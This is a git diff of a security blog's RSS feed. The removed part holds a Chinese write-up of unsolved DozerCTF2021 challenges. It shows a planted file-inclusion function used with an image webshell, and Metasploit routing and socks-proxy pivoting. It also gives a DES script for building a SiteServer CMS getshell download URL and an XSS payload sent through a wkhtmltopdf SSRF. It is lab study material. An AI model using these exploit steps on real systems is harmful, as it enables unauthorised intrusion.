@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Sun, 06 Jun 2021 10:59:50 &#43;0800</lastBuildDate>
+        <lastBuildDate>Mon, 28 Jun 2021 20:24:40 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://tyskill.github.io/rss.xml" />
         
@@ -207,302 +207,6 @@ ssh hermoine@192.168.150.136 &lt;span class=&#34;c1&#34;&gt;# ssh连接&lt;/span
                                 
                                 
                                     <category domain="https://tyskill.github.io/tags/firefox/">firefox</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>DozerCTF2021|unsolved水文篇</title>
-                <link>https://tyskill.github.io/posts/dozerctf2021/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/dozerctf2021/</guid>
-                <pubDate>Sat, 29 May 2021 00:00:00 &#43;0000</pubDate>
-                
-                    <author>tyskill@foxmail.com (tyskill)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h2 id=&#34;域渗透unsolved&#34;&gt;域渗透|unsolved&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;hint1：管理员 手抖 在qq群里发了管理员的账号密码：dozer/dozer123（建议把web1出题人给扬了）&lt;/p&gt;
-&lt;p&gt;hint2：有一次，运维人员在吃饭的时候提到了他们用了siteserver&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;1010147-lightcms&#34;&gt;10.10.1.47-lightcms&lt;/h3&gt;
-&lt;p&gt;这出题人还留着干嘛（滑稽&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;dozer/dozer123&lt;/code&gt;登录，访问&lt;code&gt;/admin/neditor/serve/catchimage&lt;/code&gt;出现debug界面，确认漏洞存在。参考之前郭院士的姿势，在添加文章处获得图片地址，通过任意文件读，读取漏洞文件确认版本号以及是否修改&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;file=../app/Http/Controllers/Admin/NEditorController.php
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现添加的函数&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;testInclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-    &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/public/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;存在文件包含，先传一张图片马，然后访问&lt;code&gt;neditor/serve/testInclude&lt;/code&gt;包含之前传的🐎，带cookie蚁剑连shell，根目录获得flag&lt;code&gt;Dozerctf{k94jf8ejdbzks2l4o40rjdnfewrkyosd}&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;然后通过msf获得meterpreter和内网地址段&lt;code&gt;10.10.1.1/24&lt;/code&gt;，自带的autoroute脚本似乎用不了，那就只能手工添加路由表&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;background &lt;span class=&#34;c1&#34;&gt;# 获得meterpreter后保存session退至后台&lt;/span&gt;
-use post/multi/manage/autoroute
-route add 10.10.1.1 255.255.255.0 &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 添加到目标指定内网段下的路由&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;设置代理&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use auxiliary/server/socks_proxy
-&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SRVPORT &amp;lt;port&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;代理完直接无脑上goby，扫tm的东方明珠塔（&lt;/p&gt;
-&lt;h3 id=&#34;10101234-siteserver&#34;&gt;10.10.1.234-SiteServer&lt;/h3&gt;
-&lt;p&gt;漏洞：&lt;a href=&#34;https://github.com/zhaoweiho/SiteServer-CMS-Remote-download-Getshell&#34;&gt;SiteServer-CMS-Remote-download-Getshell&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;没有shell直接上传漏洞利用文件，那么就需要可用的机器，比如lightcms在的&lt;code&gt;10.10.1.47&lt;/code&gt;，不过这里由于使用的是官方提供的&lt;code&gt;10.10.1.122&lt;/code&gt;的后门，就不重新去搞lightcms了。艹了，没权限写文件，只能乖乖重新搞lightcms了。。。在upload上传&lt;code&gt;poxteam.zip&lt;/code&gt;文件，然后利用漏洞&lt;/p&gt;
-&lt;p&gt;使用ha1师傅的脚本&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pyDes&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
-
-&lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x12\x34\x56\x78\x90\xAB\xCD\xEF&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5&amp;#34;&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;input_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.1.47/upload/image/poxteam.zip&amp;#34;&lt;/span&gt;
-
-&lt;span class=&#34;c1&#34;&gt;#encrypt&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CBC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pad&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;padmode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PAD_PKCS5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0add0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0equals0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0and0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0question0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0slash0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;
-
-&lt;span class=&#34;c1&#34;&gt;#decrypt&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;en&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0add0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0equals0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0and0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0question0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0slash0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;c1&#34;&gt;#en  = &amp;#34;ZjYIub/YxA2hc47NUFitAa/c/WMcuk7GQ4+P+eVq1v9u/TV3zrsdlbmZpWolkpKR&amp;#34;&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;b64en&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;en&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64en&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;生成下载地址后，访问&lt;code&gt;http://10.10.1.234/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;amp;userKeyPrefix=test&amp;amp;downloadUrl=ZjYIub0slash0YxA050add0dg8BqV7gdwFQ0s7j1zKby8mrqRkGM9Zz0slash0XFNCCMuKIWwwj31AMn&amp;amp;directoryName=hello&lt;/code&gt;解压文件（默认的sectest目录无法使用，修改为其他目录名即可），返回&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;{&amp;quot;resultMessage&amp;quot;: &amp;quot;站点模板下载成功，请到站点模板管理中查看。&amp;quot;,&amp;quot;errorMessage&amp;quot;: &amp;quot;&amp;quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到文件已经成功上传并解压，访问&lt;code&gt;http://10.10.1.234/SiteFiles/SiteTemplates/hello/include.aspx&lt;/code&gt;输入密码admin进入管理页面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210602222521.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;冰蝎🐎传上去死活连不了，msf也没有反弹成功。。。maybe是环境坏了吧（config怎么还被清空了呢？你玩尼玛呢，，，&lt;/p&gt;
-&lt;h2 id=&#34;未完成的网站unsolved&#34;&gt;未完成的网站|unsolved&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;还记得护网期间很熟悉的chrome rce嘛&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;url跳转&#34;&gt;url跳转&lt;/h3&gt;
-&lt;p&gt;功能点就只有两个：html转化pdf下载和联系表单，且联系表单处看着像存在反射型XSS，但是由于php文件无法访问导致我后面直接就把这个功能点忘了。。。&lt;/p&gt;
-&lt;p&gt;通过抓包发现pdf是通过wkhtmlpdf转化生成的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210601175105.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;搜寻一番发现这个工具存在SSRF，尝试直接&lt;code&gt;file:///etc/passwd&lt;/code&gt;发现返回500，结合默认&lt;code&gt;/people/1&lt;/code&gt;猜想后端是&lt;code&gt;http://127.0.0.1+参数&lt;/code&gt;格式，那就需要通过url跳转来SSRF，但是fuzz过后发现没办法跳转到其他地址，@Leon师傅提示只能跳转本地（&lt;code&gt;127.0.0.1&lt;/code&gt;或&lt;code&gt;localhost&lt;/code&gt;）。端口fuzz太慢，也没什么可用的，猜一波，80和5000 get。接着就sb了，想不到访问本地80端口&lt;code&gt;test.php&lt;/code&gt;验证xss是否存在。不过后面考点还是挺脑洞（是我太菜了），谁能想到chrome RCE。。。&lt;/p&gt;
-&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;/download?url=@localhost:80/test.php?name=12&amp;amp;email=12@12&amp;amp;message=11
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载pdf后发现name字段会插入html中，因此可以尝试XSS。&lt;/p&gt;
-&lt;p&gt;payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/download?url=@localhost:80/test.php?name=&amp;lt;script&amp;gt;document.write(&#39;tyskill&#39;)&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功打印tyskill字符串（不过实际上打印了两遍，猜测是反射型打印了一次，转pdf又打印了一次）&lt;/p&gt;
-&lt;h3 id=&#34;chrome-rce&#34;&gt;chrome rce&lt;/h3&gt;
-&lt;p&gt;官方&amp;quot;粗糙&amp;quot;的wp中说从UA中可以发现使用的是chrome，然后联想到rce，河里，这很合理&lt;/p&gt;
-&lt;p&gt;获得UA&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userAgent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210601175042.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;发现chrome，但是不出网，没办法通过访问&lt;code&gt;exp.html&lt;/code&gt;利用漏洞。只能通过js来利用了，shellcode咋改？嘤嘤嘤，菜鸡落泪&lt;/p&gt;
-&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/xiaozi/p/13022622.html&#34;&gt;使用msf入侵多层级网络架构&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://ha1c9on.top/2021/05/31/dozer-pentest-by-chun/&#34;&gt;Dozer 域渗透系列 By 春 预期&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://v2as.com/article/505a3c27-32a3-49b4-b6ae-5eea55330f1e&#34;&gt;BurpSuite多重代理的情形&lt;/a&gt;&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/categories/ctf/">CTF</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/xss/">XSS</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>[Linux提权]PATH提权</title>
-                <link>https://tyskill.github.io/posts/path%E6%8F%90%E6%9D%83/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/path%E6%8F%90%E6%9D%83/</guid>
-                <pubDate>Tue, 25 May 2021 00:00:00 &#43;0000</pubDate>
-                
-                    <author>tyskill@foxmail.com (tyskill)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h2 id=&#34;前置知识&#34;&gt;前置知识&lt;/h2&gt;
-&lt;h3 id=&#34;linux环境变量&#34;&gt;Linux环境变量&lt;/h3&gt;
